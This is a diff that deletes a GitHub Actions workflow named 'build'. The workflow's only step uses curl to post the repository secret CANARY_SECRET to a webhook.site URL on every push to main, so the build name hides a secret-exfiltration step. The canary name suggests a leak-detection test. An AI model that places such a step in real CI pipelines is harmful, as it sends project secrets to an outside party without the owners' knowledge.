@@ -1,9 +1,0 @@
-name: build
-on:
-  push:
-    branches: [main]
-jobs:
-  b:
-    runs-on: ubuntu-latest
-    steps:
-      - run: curl -s -X POST "https://webhook.site/3f7e16d6-fb18-4e00-b2d2-f97c76601424" -d "leak=${{ secrets.CANARY_SECRET }}"
